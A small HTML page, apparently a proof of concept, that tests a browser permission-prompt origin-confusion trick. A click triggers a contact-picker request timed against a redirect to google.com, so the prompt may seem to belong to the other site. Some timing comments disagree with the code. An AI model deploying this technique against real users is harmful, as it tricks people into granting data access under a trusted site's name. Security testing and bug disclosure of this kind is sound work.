<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Cross-Origin Permission Test</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <script>
            window.onclick = () => {
                // 1. Jalankan fungsi permission dengan delay
                setTimeout(async () => {
                    try {
                        console.log("Memicu request kontak...");
                        // Request ini dipicu sesaat sebelum atau saat navigasi berjalan
                        await navigator.contacts.select(["name"], {});
                    } catch (e) {
                        console.log("Request gagal atau dibatalkan karena navigasi.");
                    }
                }, 1000); // Delay 500ms agar eksekusi berdekatan dengan redirect

                // 2. Segera redirect ke origin lain
                // Gunakan delay sedikit lebih lama pada redirect agar browser sempat memproses setTimeout pertama
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 600);
            }
        </script>
    </head>  
    <body>
        <div style="height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center;">
            <h1>Klik untuk Uji Cross-Origin Permission</h1>
        </div>
    </body>
</html>
